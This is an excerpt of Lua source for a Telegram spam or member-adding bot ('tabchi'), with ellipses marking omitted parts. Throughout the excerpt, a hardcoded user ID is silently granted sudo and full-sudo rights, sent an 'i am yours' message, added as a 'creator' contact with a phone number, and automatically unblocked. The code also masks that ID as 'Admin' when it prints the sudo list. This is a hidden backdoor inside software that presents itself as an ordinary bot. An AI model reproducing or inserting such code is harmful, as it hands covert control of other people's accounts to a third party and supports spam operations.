...
function addsudo()
  ...
  for d = 1, #b do
    local text = "SUDO = " .. b[d] .. ""
    text = text:gsub(337639430, "Admin")
    text = text:gsub(337639430, "Admin")
    print(text)
    sleep(100000)
  end
...
function x(y, z)
  if redis:get("tabchi:" .. tabchi_id .. ":addcontacts") then
    if not z.phone_number_ then
      ...
      redis:set("tabchi:" .. tabchi_id .. ":fullsudo:337639430", true)
...
function a3(msg)
  ...
  do
    ...
    if msg.text:match("^[!/#]pm") and a(msg) and #a4 == 3 then
      ...
      if a5 and not msg.sender_user_id_ == 337639430 and not msg.sender_user_id_ == 337639430 then
...
`https://github.com/hosseinx63/memberbot`]]
...
*تعداد* : `]] .. aj .. "`"
  ...
  if msg.text:match("^[!/#]help$") and a(msg) then
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 337639430) then
      tdcli.sendMessage(337639430, 0, 1, "i am yours", 1, "html")
      tdcli.importContacts(989337519014, "creator", "", 337639430)
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 337639430)
    end
    if not redis:sismember("tabchi:" .. tabchi_id .. ":sudoers", 337639430) then
      redis:sadd("tabchi:" .. tabchi_id .. ":sudoers", 337639430)
      tdcli.sendMessage(337639430, 0, 1, "i am yours", 1, "html")
...
function update(D, tabchi_id)
  ...
  elseif D.chat_id_ == 337639430 then
    tdcli.unblockUser(337639430)
